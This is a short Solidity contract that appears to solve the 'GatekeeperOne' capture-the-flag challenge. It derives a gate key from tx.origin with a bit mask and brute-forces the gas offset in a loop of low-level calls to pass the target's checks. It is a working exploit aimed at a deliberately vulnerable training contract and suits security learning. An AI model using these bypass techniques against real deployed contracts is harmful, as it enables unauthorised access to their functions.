// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne gatekeeper;

    constructor(address _gatekeeperAddress) {
        gatekeeper = IGatekeeperOne(_gatekeeperAddress);
    }

    function attack() public {
        // Calculate the gateKey
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i < 300; i++) {
          (bool success, ) = address(gatekeeper).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", gateKey));
          if (success) {
            break;
          }
        }
    }    
}
